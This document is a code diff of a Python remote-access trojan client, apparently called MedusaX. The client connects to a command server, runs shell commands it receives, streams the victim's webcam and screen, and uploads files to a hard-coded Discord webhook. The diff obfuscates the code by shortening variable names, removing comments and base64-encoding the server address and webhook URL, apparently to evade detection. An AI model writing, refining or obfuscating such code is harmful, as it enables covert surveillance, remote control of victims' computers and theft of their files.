@@ -5,61 +5,50 @@ import struct
 import time
 import requests
 import os
+import base64
+import pyautogui
+import numpy as np
 
-server_ip = "10.0.1.33"
-server_port = 9999
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((server_ip, server_port))
+s = "MTAuMC4xLjMz"
+p = 9999
+c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+c.connect((base64.b64decode(s).decode(), p))
 
-def send_frame():
-    global client
-    cap = cv2.VideoCapture(0)
-    
+def f1():
+    global c
+    v = cv2.VideoCapture(0)
     while True:
-        ret, frame = cap.read()
-        if not ret:
+        r, f = v.read()
+        if not r:
             break
+        _, e = cv2.imencode('.jpg', f)
+        c.sendall(struct.pack(">L", len(e)) + e.tobytes())
+    v.release()
 
-        _, encoded = cv2.imencode('.jpg', frame)
-        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())
-
-    cap.release()
-
-def send_screen():
-    import pyautogui
-    import numpy as np
-    
+def f2():
     while True:
-        screenshot = pyautogui.screenshot()
-        _, encoded = cv2.imencode('.jpg', cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR))
-        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())
+        s = pyautogui.screenshot()
+        _, e = cv2.imencode('.jpg', cv2.cvtColor(np.array(s), cv2.COLOR_RGB2BGR))
+        c.sendall(struct.pack(">L", len(e)) + e.tobytes())
 
 while True:
     try:
-        command = client.recv(1024).decode().strip()
-
-        if command.startswith("!"):
-            # MedusaX Commands
-            if command.startswith("!download"):
-                filename = command.split(" ", 1)[1]
-                if os.path.exists(filename):
-                    with open(filename, "rb") as f:
-                        requests.post("https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2", files={"file": f})
-
-            elif command.startswith("!webcam_stream"):
-                send_frame()
-
-            elif command.startswith("!screen_stream"):
-                send_screen()
-
-            elif command.startswith("CTRL+P"):
-                print("[ * ] Stopping stream...")
+        cmd = c.recv(1024).decode().strip()
+        if cmd.startswith("!"):
+            if cmd.startswith("!download"):
+                fn = cmd.split(" ", 1)[1]
+                if os.path.exists(fn):
+                    with open(fn, "rb") as f:
+                        requests.post(base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyMTQxNDk1Njc1NDkzMTcyMy9SZ1JzQU0zYk01QkFMajhkV0JhZ0tlWHdvTkhFV05ST0xpaHF1MjFqeUc1OEtpS2ZEOUtOeFFLT1RD
+RFZoTDVKX0JDMg==").decode(), files={"file": f})
+            elif cmd.startswith("!webcam_stream"):
+                f1()
+            elif cmd.startswith("!screen_stream"):
+                f2()
+            elif cmd.startswith("CTRL+P"):
                 break
         else:
-            # Shell command execution
-            output = subprocess.getoutput(command)
-            client.send(output.encode())
-
-    except Exception as e:
-        print(f"[ - ] Error: {e}")
+            o = subprocess.getoutput(cmd)
+            c.send(o.encode())
+    except Exception:
         break
